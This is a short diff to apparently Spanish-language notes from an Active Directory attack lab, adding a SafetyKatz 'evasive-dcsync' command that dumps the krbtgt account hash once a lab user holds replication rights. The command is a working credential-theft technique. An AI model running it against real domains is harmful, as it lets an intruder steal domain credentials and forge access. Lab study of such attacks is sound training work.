@@ -1032,5 +1032,8 @@ Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchSco
 ```
 
 Viendo que ahora tenemos *Acces Allowed*, gracias a esto ahora con el usuario *student97* podremos obtener el hashs de *krbtgt* o cualquier otro ususario
-```shel
+```shell
+C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
 ```
+
+*LO - 13*
